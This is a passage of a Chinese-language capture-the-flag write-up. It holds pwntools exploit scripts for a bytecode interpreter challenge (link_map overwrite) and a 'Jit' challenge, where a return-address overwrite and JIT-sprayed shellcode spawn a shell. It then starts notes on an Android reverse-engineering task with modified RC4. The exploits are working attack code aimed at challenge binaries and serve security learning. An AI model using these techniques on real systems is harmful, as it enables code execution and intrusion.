</span></span><span class=line><span class=cl>            <span class=n>bpt</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>b</span><span class=p>(</span><span class=n>x</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span><span class=n>go</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span><span class=n>action</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span> <span class=o>!=</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bpt</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>go</span> <span class=ow>or</span> <span class=n>action</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>script</span> <span class=o>+=</span> <span class=s1>&#39;c</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>+=</span> <span class=n>action</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_off</span><span class=p>(</span><span class=n>off</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;@&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>off</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=n>ch</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;.&#39;</span> <span class=o>+</span> <span class=n>ch</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shift</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;&gt;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shift_8</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;+&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data_size</span> <span class=o>=</span> <span class=mh>0x200000</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data size</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>data_size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># shift_8()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>linkmap_off</span> <span class=o>=</span> <span class=mh>0x424180</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_off</span><span class=p>(</span><span class=n>linkmap_off</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x09</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shift</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x12</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_off</span><span class=p>(</span><span class=mh>0xa8</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x40</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add_off</span><span class=p>(</span><span class=mh>0x110</span><span class=o>-</span><span class=mh>0xa8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x40</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add_off</span><span class=p>(</span><span class=mh>0x120</span><span class=o>-</span><span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x40</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>quit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code size</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># b([&#39;_dl_fini&#39;,0x130e])</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;your code</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=jit>Jit</h2><p>Ida 7.7的i64</p><p>交互是输俩十六进制字符串</p><p>013f2eff883这样的</p><p>漏洞应该在generate_code函数</p><p>有效的opcode在check_code里</p><p>2k行看不动了</p><p>没必要看，只要测一下那些opcode代表的操作，就会发现有内存写的指令，同时还允许使用rbp为目标寄存器，就直接按他的逻辑写汇编改返回地址然后jit spray就完事了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;1.13.101.243&#39;</span><span class=p>,</span><span class=s1>&#39;26419&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./jit&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>script</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bpt</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>,</span><span class=n>bigFileOff</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=n>addr_or_sym</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x400000</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>bigFileOff</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;b * </span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;brva </span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>type</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>script</span> <span class=o>+=</span> <span class=s1>&#39;b &#39;</span> <span class=o>+</span> <span class=n>addr_or_sym</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>type</span><span class=p>(</span><span class=n>addr_or_sym</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>addr_or_sym</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bpt</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>b</span><span class=p>(</span><span class=n>x</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span><span class=n>go</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span><span class=n>action</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span> <span class=o>!=</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bpt</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>go</span> <span class=ow>or</span> <span class=n>action</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>script</span> <span class=o>+=</span> <span class=s1>&#39;c</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>+=</span> <span class=n>action</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_code</span><span class=p>(</span><span class=n>op</span><span class=p>,</span><span class=n>r1</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span><span class=n>off</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span><span class=n>imm</span><span class=o>=</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p8</span><span class=p>(</span><span class=n>op</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p8</span><span class=p>((</span><span class=n>r1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>off</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># code += payload</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x80\x88</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sd</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Program: &#39;</span><span class=p>,</span><span class=n>binascii</span><span class=o>.</span><span class=n>hexlify</span><span class=p>(</span><span class=n>code</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Memory: &#39;</span><span class=p>,</span><span class=n>binascii</span><span class=o>.</span><span class=n>hexlify</span><span class=p>(</span><span class=n>mem</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_imm</span><span class=p>(</span><span class=n>r</span><span class=p>,</span><span class=n>imm</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=n>make_code</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=n>r</span><span class=p>,</span><span class=n>imm</span><span class=o>=</span><span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reg_add</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span><span class=n>src</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=n>make_code</span><span class=p>(</span><span class=mh>0xc</span><span class=p>,</span><span class=n>r1</span><span class=o>=</span><span class=n>src</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 0x18 movabs </span>
</span></span><span class=line><span class=cl><span class=c1># 0xde jle</span>
</span></span><span class=line><span class=cl><span class=c1># 0x62-0x7b mov xxx ptr [r], r/imm</span>
</span></span><span class=line><span class=cl><span class=c1># 0x5 - 0xde jmp/jxx    </span>
</span></span><span class=line><span class=cl><span class=c1># 0xac xor</span>
</span></span><span class=line><span class=cl><span class=c1># 0xbc mov</span>
</span></span><span class=line><span class=cl><span class=c1># 0xc7 sar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rax</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>r9</span> <span class=o>=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>r8</span> <span class=o>=</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=n>rbx</span> <span class=o>=</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl><span class=n>r13</span> <span class=o>=</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>r14</span> <span class=o>=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>r15</span> <span class=o>=</span> <span class=mi>9</span>
</span></span><span class=line><span class=cl><span class=n>rbp</span> <span class=o>=</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mov</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span><span class=n>src</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=n>make_code</span><span class=p>(</span><span class=mh>0xbc</span><span class=p>,</span><span class=n>r1</span><span class=o>=</span><span class=n>src</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mov_imm</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span><span class=n>imm</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=n>make_code</span><span class=p>(</span><span class=mh>0xb7</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=n>dst</span><span class=p>,</span><span class=n>imm</span><span class=o>=</span><span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mov</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span><span class=n>rax</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mov_imm</span><span class=p>(</span><span class=n>rdx</span><span class=p>,</span><span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mov</span><span class=p>(</span><span class=n>rdi</span><span class=p>,</span><span class=n>rax</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mov_imm</span><span class=p>(</span><span class=n>rsi</span><span class=p>,</span><span class=mh>0x2000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mov_imm</span><span class=p>(</span><span class=n>rax</span><span class=p>,</span><span class=mh>0xa</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_imm</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span><span class=mh>0x3b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=n>make_code</span><span class=p>(</span><span class=mh>0x7b</span><span class=p>,</span><span class=n>r1</span><span class=o>=</span><span class=n>rbx</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=n>rbp</span><span class=p>,</span><span class=n>off</span><span class=o>=</span><span class=mh>0x28</span><span class=p>)</span> <span class=c1># mov qword ptr [rbp+0x28],rbx /// return address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add32</span><span class=p>(</span><span class=n>r</span><span class=p>,</span><span class=n>imm</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>code</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>+=</span> <span class=n>make_code</span><span class=p>(</span><span class=mh>0x4</span><span class=p>,</span><span class=n>r2</span><span class=o>=</span><span class=n>r</span><span class=p>,</span><span class=n>imm</span><span class=o>=</span><span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tail</span> <span class=o>=</span> <span class=mh>0x03eb0000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;syscall
</span></span></span><span class=line><span class=cl><span class=s1>xor eax,eax
</span></span></span><span class=line><span class=cl><span class=s1>push rsi;pop rdx;
</span></span></span><span class=line><span class=cl><span class=s1>push rdi;pop rsi;
</span></span></span><span class=line><span class=cl><span class=s1>push rax;pop rdi;
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>sc</span><span class=o>.</span><span class=n>splitlines</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>add32</span><span class=p>(</span><span class=n>r15</span><span class=p>,</span><span class=n>u16</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>i</span><span class=p>))</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># b(0x2947,go=True)   </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sd</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=re>Re</h1><h2 id=ezandroid>ezAndroid</h2><p><img src=/img/2023-08-19Wmctf/20230821210707945.jpg alt=img></p><p>输入账号和密码，注册在native里，d810去混淆发现是rc4加密和aes加密，全部魔改了，通过动态调试找到rc4的key是12345678，他rc4魔改了后面有个异或i</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xE9</span><span class=p>,</span> <span class=mh>0x97</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0xE6</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0xEB</span><span class=p>,</span> <span class=mh>0xBD</span><span class=p>,</span> <span class=mh>0xC1</span><span class=p>,</span> <span class=mh>0xAB</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>i</span>
